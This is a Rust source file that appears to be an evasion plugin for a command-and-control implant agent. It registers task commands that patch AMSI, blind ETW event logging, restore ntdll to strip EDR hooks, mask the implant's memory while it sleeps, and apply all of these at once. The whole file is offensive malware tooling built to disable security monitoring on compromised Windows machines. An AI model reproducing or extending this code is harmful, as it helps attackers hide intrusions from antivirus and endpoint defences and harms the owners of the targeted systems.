// evasion plugin — Windows evasion commands.
//   amsi_patch (60):  patch AmsiScanBuffer → E_INVALIDARG.
//   etw_blind  (61):  patch EtwEventWrite (+Ex) → ret.
//   unhook_ntdll (68): restore ntdll .text from disk (removes EDR hooks).
//   mask_sleep (69):  encrypt exec regions, sleep via NtDelayExecution, restore.
//   ssn_diag   (70):  report SSN resolution + gadget availability.
//   evasion_all (71): apply AMSI + ETW + unhook in one shot.
// Enabled via the "evasion" feature. On non-Windows the commands register but
// report "unsupported" (the evasion module is compiled out there).

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};

pub const CMD_AMSI_PATCH: u32 = 60;
pub const CMD_ETW_BLIND: u32 = 61;
pub const CMD_UNHOOK_NTDLL: u32 = 68;
pub const CMD_MASK_SLEEP: u32 = 69;
pub const CMD_SSN_DIAG: u32 = 70;
pub const CMD_EVASION_ALL: u32 = 71;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(CMD_AMSI_PATCH, exec_amsi_patch)?;
    r.register(CMD_ETW_BLIND, exec_etw_blind)?;
    r.register(CMD_UNHOOK_NTDLL, exec_unhook_ntdll)?;
    r.register(CMD_MASK_SLEEP, exec_mask_sleep)?;
    r.register(CMD_SSN_DIAG, exec_ssn_diag)?;
    r.register(CMD_EVASION_ALL, exec_evasion_all)?;
    Ok(())
}

fn exec_amsi_patch(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    run_win(task, |task| {
        crate::evasion::patch::patch_amsi()?;
        Ok(Some(TaskResult::ok(&task.id, "AMSI patched\n".into())))
    })
}

fn exec_etw_blind(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    run_win(task, |task| {
        crate::evasion::patch::patch_etw_ex()?;
        Ok(Some(TaskResult::ok(&task.id, "ETW blinded\n".into())))
    })
}

fn exec_unhook_ntdll(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    run_win(task, |task| {
        crate::evasion::unhook::unhook_ntdll()?;
        Ok(Some(TaskResult::ok(&task.id, "ntdll unhooked\n".into())))
    })
}

fn exec_mask_sleep(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    let v: serde_json::Value =
        serde_json::from_str(&task.args).unwrap_or(serde_json::Value::Null);
    let ms = v["ms"].as_i64().unwrap_or(5000) as i32;
    run_win(task, |task| {
        crate::evasion::mask::mask_sleep(ms)?;
        Ok(Some(TaskResult::ok(&task.id, format!("slept masked {ms}ms\n"))))
    })
}

fn exec_ssn_diag(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    run_win(task, |task| {
        let out = crate::evasion::diag();
        Ok(Some(TaskResult::ok(&task.id, out)))
    })
}

fn exec_evasion_all(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    run_win(task, |task| {
        crate::evasion::apply_evasion();
        Ok(Some(TaskResult::ok(&task.id, "evasion applied (amsi+etw+unhook)\n".into())))
    })
}

/// Run a Windows-only handler; on non-Windows report an error.
fn run_win<F>(task: &Task, f: F) -> Option<TaskResult>
where
    F: FnOnce(&Task) -> Result<Option<TaskResult>, String>,
{
    #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
    {
        match f(task) {
            Ok(r) => r,
            Err(e) => Some(TaskResult::fail(&task.id, e)),
        }
    }
    #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
    {
        let _ = f;
        Some(TaskResult::fail(&task.id, "evasion is Windows x64-only".into()))
    }
}
